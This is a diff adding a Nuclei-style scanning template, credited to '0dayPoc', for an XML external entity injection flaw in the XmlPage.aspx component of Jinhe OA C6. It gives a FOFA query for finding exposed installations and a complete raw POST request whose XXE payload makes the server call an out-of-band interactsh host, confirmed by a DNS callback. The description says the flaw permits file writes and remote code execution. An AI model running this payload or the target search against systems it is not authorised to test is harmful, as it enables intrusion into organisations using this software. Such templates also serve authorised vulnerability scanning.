@@ -1,0 +1,30 @@
+id: jinhe-oa-xmlpage-xxe
+info:
+  name: "金和 OA XmlPage.aspx组件XML外部实体注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="金和网络-金和OA"
+      金和网络作为专业信息化服务商，提供组织协同OA系统开发平台及电子政务解决方案。其OA系统C6版本XmlPage.aspx组件存在XML外部实体注入漏洞。攻击者可利用该漏洞通过构造恶意XML请求，在具备相应权限的情况下向服务器写入恶意文件，实现远程代码执行或敏感信息泄露。
+  tags: 金和OA
+http:
+- raw:
+  - |
+    POST /C6/JHSoft.Web.Calendar/XmlPage.aspx/?val=con HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: text/xml
+
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE root [
+      <!ENTITY % test SYSTEM "http://{{interactsh-url}}">
+      %test;
+    ]>
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
